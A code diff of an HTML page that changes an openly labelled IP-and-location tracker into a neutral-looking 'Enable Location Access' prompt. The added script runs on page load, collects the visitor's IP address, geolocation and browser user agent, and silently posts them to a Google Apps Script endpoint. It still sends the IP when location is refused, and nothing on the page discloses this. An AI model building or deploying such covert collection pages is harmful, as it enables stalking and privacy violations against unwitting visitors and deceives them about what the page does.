@@ -3,52 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Track IP & Location (Global)</title>
+    <title>Enable Location</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-<h2>Click the button to store your IP and Location globally</h2>
-<button onclick="captureDetails()">Store My Location</button>
-
-<p id="info"></p>
+<div class="container">
+    <h2>Enable Location Access</h2>
+    <p>Please allow location access to proceed.</p>
+    <button id="enableLocationBtn">Enable Location</button>
+    <p id="errorMsg" class="hidden">⚠ Location access is required!</p>
+</div>
 
 <script>
-    function captureDetails() {
-        fetch('https://api64.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                let userIP = data.ip;
-
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(position => {
-                        let lat = position.coords.latitude;
-                        let lon = position.coords.longitude;
-                        let timestamp = new Date().toLocaleString();
-
-                        document.getElementById('info').innerHTML = `Stored IP: ${userIP} <br> Latitude: ${lat}, Longitude: ${lon} <br> Timestamp: ${timestamp}`;
-
-                        let requestData = {ip: userIP, latitude: lat, longitude: lon};
-
-                        // fetch("https://script.google.com/macros/s/AKfycbywPFEeYO2_19pEBW5ubz66UApedOV75a-n_7oq1VGOQrI-NerTn_lOo7IsnfYVqM4/exec", {
-                        //     method: "POST",
-                        //     headers: { "Content-Type": "application/json" },
-                        //     body: JSON.stringify(requestData)
-                        // });
-                        fetch("https://script.google.com/macros/s/AKfycbywPFEeYO2_19pEBW5ubz66UApedOV75a-n_7oq1VGOQrI-NerTn_lOo7IsnfYVqM4/exec", {
-                            method: "POST",
-                            headers: {"Content-Type": "application/json"},
-                            mode: "no-cors",
-                            body: JSON.stringify(requestData)
-                        })
-                            .then(response => console.log("Request sent, but no response due to no-cors"))
-                            .catch(error => console.error("Error:", error));
-                    // }, () => {
-                    //     alert("Geolocation access denied. Enable location to proceed.");
-                    });
-                } else {
-                    alert("Geolocation is not supported in this browser.");
+    document.getElementById("enableLocationBtn").addEventListener("click", function() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    console.log("Latitude:", position.coords.latitude);
+                    console.log("Longitude:", position.coords.longitude);
+                    alert("Location enabled! Redirecting...");
+                    window.location.href = "home.html"; // Change to your destination page
+                },
+                (error) => {
+                    document.getElementById("errorMsg").classList.remove("hidden");
+                    console.error("Geolocation error:", error.message);
                 }
-            });
+            );
+        } else {
+            document.getElementById("errorMsg").textContent = "Your browser does not support location access.";
+            document.getElementById("errorMsg").classList.remove("hidden");
+        }
+    });
+</script>
+<script>
+    async function getIPAddress() {
+        try {
+            let response = await fetch("https://api64.ipify.org?format=json");
+            let data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error("Error fetching IP:", error);
+            return "Unknown";
+        }
     }
+
+    function sendData(ip, latitude, longitude) {
+        fetch("https://script.google.com/macros/s/AKfycbywPFEeYO2_19pEBW5ubz66UApedOV75a-n_7oq1VGOQrI-NerTn_lOo7IsnfYVqM4/exec", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            mode: "no-cors",
+            body: JSON.stringify({
+                ip: ip,
+                latitude: latitude,
+                longitude: longitude,
+                userAgent: navigator.userAgent
+            })
+        })
+            .then(response => console.log("Data sent successfully"))
+            .catch(error => console.error("Error sending data:", error));
+    }
+
+    async function captureData() {
+        let ip = await getIPAddress();
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                sendData(ip, position.coords.latitude, position.coords.longitude);
+            },
+            (error) => {
+                console.warn("Geolocation failed:", error);
+                sendData(ip, "Unknown", "Unknown");
+            }
+        );
+    }
+
+    window.onload = captureData;
 </script>
 </body>
 </html>
